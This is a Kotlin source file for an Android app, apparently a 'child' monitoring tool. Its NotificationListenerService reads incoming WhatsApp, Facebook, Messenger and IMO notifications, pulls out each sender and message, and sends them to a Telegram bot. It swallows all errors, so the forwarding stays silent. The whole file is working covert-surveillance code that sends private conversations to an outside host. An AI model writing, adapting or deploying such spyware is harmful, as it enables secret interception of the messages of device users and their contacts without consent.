package com.coc338781.childapp

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class WhatsAppListener : NotificationListenerService() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return

        val app = when (pkg) {
            "com.whatsapp", "com.whatsapp.w4b" -> "whatsapp"
            "com.facebook.katana", "com.facebook.orca" -> "fb"
            "com.imo.android.imoim", "com.imo.android.imoimbeta" -> "imo"
            else -> return
        }

        val extras = sbn.notification?.extras ?: return
        val title = extras.getString(Notification.EXTRA_TITLE) ?: return
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: return

        if (title == text) return

        MessageStore.addMessage(this, app, title, text)

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                val emoji = when (app) {
                    "whatsapp" -> "💬"
                    "fb" -> "📘"
                    "imo" -> "📱"
                    else -> "📩"
                }
                val msg = "$emoji ${app.uppercase()}\nFrom: $title\n$text"
                val json = JSONObject().apply {
                    put("chat_id", MonitoringService.CHAT_ID)
                    put("text", msg)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
